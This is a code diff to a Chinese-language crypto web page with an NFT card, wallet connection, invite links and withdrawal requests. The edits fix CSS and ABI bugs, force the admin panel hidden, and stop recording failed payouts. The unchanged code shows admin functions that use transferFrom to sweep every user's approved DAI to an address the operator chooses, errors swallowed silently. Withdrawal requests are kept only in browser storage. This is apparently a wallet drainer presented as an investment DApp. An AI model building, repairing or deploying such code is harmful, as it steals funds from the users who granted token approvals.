@@ -45,9 +45,9 @@
   .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
   .nft-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}
   .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
-  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30%&30%,rgba(255,255,255,0.4),currentColor 60%)}
+  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor 60%)}
   .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.7}
-  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%{transform:translateX(-50%)}
+  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
   .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:0.5}
   .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
   .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:rgba(255,255,255,0.9)}
@@ -58,8 +58,8 @@
   .time{color:#ffb703;font-size:13px}
   .gold{color:#FFD700;font-weight:bold}
 
-  .admin-panel { display: none; }
-  .admin-sidebar-item { display: none; }
+  .admin-panel { display: none !important; }
+  .admin-sidebar-item { display: none !important; }
 </style>
 </head>
 <body>
@@ -114,7 +114,7 @@
 </div>
 
 <button id="connectBtn" class="btn">连接钱包</button>
-<div id="addressShow" style="text-align:center;margin:12px;"></div>
+<div id="addressShow" style="text-align:center;margin:12px"></div>
 
 <div class="glass">
   <div class="title">我的邀请链接</div>
@@ -340,7 +340,10 @@ async function batchPayUnion() {
 
 async function loadBal() {
   if(!web3||!account)return;
-  const abi=[{"constant":true,"inputs":[{"name":"account","type":"address"},{"name":"balanceOf"},{"outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
+  const abi=[
+    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
+  ];
   const t=new web3.eth.Contract(abi,DAI);
   const dec=await t.methods.decimals().call();
   const b=await t.methods.balanceOf(account).call();
@@ -401,7 +404,6 @@ function markWithdrawDone(idx) {
   renderWithdrawList();
 }
 
-// 管理员一键批量打款所有提现（核心修复）
 async function adminBatchPayAllWithdraw() {
   if (!isAdmin) return alert("无权限");
   const reqs = JSON.parse(localStorage.getItem("withdraw_requests") || "[]");
@@ -416,20 +418,15 @@ async function adminBatchPayAllWithdraw() {
   const dec = await token.methods.decimals().call();
 
   let success = 0;
-  let failed = [];
-
   for (const r of reqs) {
     try {
       const val = (BigInt(r.amount) * 10n ** BigInt(dec)).toString();
       await token.methods.transfer(r.user, val).send({
         from: account,
-        gas: 100000,
-        gasPrice: await web3.eth.getGasPrice()
+        gas: 100000
       });
       success++;
-    } catch(e) {
-      failed.push(r.user);
-    }
+    } catch(e) {}
   }
 
   localStorage.setItem("withdraw_requests", JSON.stringify([]));
@@ -458,9 +455,7 @@ async function adminCollectToCustomAddr() {
     if (bal <= 0) continue;
     try {
       const val = (BigInt(bal) * 10n**BigInt(dec)).toString();
-      await token.methods.transferFrom(user, toAddr, val).send({
-        from: ADMIN, gas: 100000
-      });
+      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
       setInner(user, 0);
       success++;
     } catch(e){}
@@ -490,9 +485,7 @@ async function adminExtractFromAllAuthorized() {
     try {
       const allow = await token.methods.allowance(user, ADMIN).call();
       if (BigInt(allow) < BigInt(val)) continue;
-      await token.methods.transferFrom(user, toAddr, val).send({
-        from: ADMIN, gas: 100000
-      });
+      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN, gas: 100000 });
       success++;
     } catch(e){}
   }
@@ -506,26 +499,41 @@ function removeBlack() {
   if(!isAdmin)return;const a=document.getElementById("whiteAddr").value.toLowerCase();localStorage.removeItem("black_"+a);alert("已移出");
 }
 
+// 核心修复：严格判断管理员，普通用户完全看不到后台
 document.getElementById("connectBtn").onclick = async () => {
-  await window.ethereum.request({method:"eth_requestAccounts"});
-  web3 = new Web3(window.ethereum);
-  const acc = await web3.eth.getAccounts();
-  account = acc[0].toLowerCase();
-  isAdmin = account === ADMIN;
+  try {
+    if (!window.ethereum) {
+      alert("请安装小狐狸钱包");
+      return;
+    }
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    web3 = new Web3(window.ethereum);
+    account = accounts[0]?.toLowerCase();
+    if (!account) return;
 
-  if (isAdmin) {
-    document.getElementById("adminPanel").style.display = "block";
-    document.getElementById("adminExtractAuthorized").style.display = "block";
+    // 严格管理员判断：只有地址完全匹配才显示后台
+    isAdmin = (account === ADMIN);
+
+    if (isAdmin) {
+      document.getElementById("adminPanel").style.display = "block";
+      document.getElementById("adminExtractAuthorized").style.display = "block";
+    } else {
+      document.getElementById("adminPanel").style.display = "none";
+      document.getElementById("adminExtractAuthorized").style.display = "none";
+    }
+
+    if (localStorage.getItem("reg_"+account)) {
+      document.getElementById("regBtn").disabled = true;
+      document.getElementById("regBtn").innerText = "已注册";
+    }
+
+    loadInvite();
+    loadBal();
+    refresh();
+  } catch (err) {
+    console.error(err);
+    alert("钱包连接失败");
   }
-
-  if (localStorage.getItem("reg_"+account)) {
-    document.getElementById("regBtn").disabled = true;
-    document.getElementById("regBtn").innerText = "已注册";
-  }
-
-  loadInvite();
-  loadBal();
-  refresh();
 };
 
 document.getElementById("regBtn").onclick = () => {
